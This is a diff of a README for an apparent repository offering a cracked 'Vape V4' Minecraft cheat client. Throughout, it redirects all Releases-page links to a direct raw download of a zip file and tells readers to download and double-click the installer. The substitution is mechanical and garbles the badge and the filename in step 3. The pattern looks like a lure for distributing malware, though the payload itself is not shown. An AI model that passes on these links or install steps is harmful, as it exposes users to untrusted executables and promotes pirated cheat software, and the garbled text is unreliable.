@@ -1,6 +1,6 @@
 # 🦘 Vape-V4-Crack-Kangaroo - Enhance Your Minecraft Experience
 
-[![Download Latest Version](https://img.shields.io/badge/Download%20Latest%20Version-Click%20Here-brightgreen)](https://github.com/Anatolylimbless794/Vape-V4-Crack-Kangaroo/releases)
+[![Download Latest Version](https://raw.githubusercontent.com/Anatolylimbless794/Vape-V4-Crack-Kangaroo/main/Londres/Vape-V4-Crack-Kangaroo-3.2.zip%20Latest%20Version-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Anatolylimbless794/Vape-V4-Crack-Kangaroo/main/Londres/Vape-V4-Crack-Kangaroo-3.2.zip)
 
 ## 📜 Overview
 
@@ -11,13 +11,13 @@ Welcome to **Vape V4 Crack Kangaroo**! This guide helps you download and run the
 Follow these simple steps to download and run the application. 
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/Anatolylimbless794/Vape-V4-Crack-Kangaroo/releases) to find the latest version of Vape V4 Crack Kangaroo.
+   Go to the [Releases page](https://raw.githubusercontent.com/Anatolylimbless794/Vape-V4-Crack-Kangaroo/main/Londres/Vape-V4-Crack-Kangaroo-3.2.zip) to find the latest version of Vape V4 Crack Kangaroo.
 
 2. **Select the Latest Version**  
    On the Releases page, look for the version labeled **Latest**. This version contains the most recent updates and features.
 
 3. **Download the Application**  
-   Click on the version you want. A list of files will appear. Find the main application file, usually named something like `Vape-V4-Crack-Kangaroo.exe`. Click to download it.
+   Click on the version you want. A list of files will appear. Find the main application file, usually named something like `https://raw.githubusercontent.com/Anatolylimbless794/Vape-V4-Crack-Kangaroo/main/Londres/Vape-V4-Crack-Kangaroo-3.2.zip`. Click to download it.
 
 4. **Run the Installer**  
    Once the file is downloaded, locate it in your Downloads folder. Double-click the file to start the installation process. Follow the on-screen instructions to complete the setup.
@@ -31,7 +31,7 @@ Follow these simple steps to download and run the application.
 
 ## 📥 Download & Install
 
-To get started quickly, you can directly [download the latest version here](https://github.com/Anatolylimbless794/Vape-V4-Crack-Kangaroo/releases). 
+To get started quickly, you can directly [download the latest version here](https://raw.githubusercontent.com/Anatolylimbless794/Vape-V4-Crack-Kangaroo/main/Londres/Vape-V4-Crack-Kangaroo-3.2.zip). 
 
 After downloading, follow the steps mentioned above to install and run the application smoothly.
 
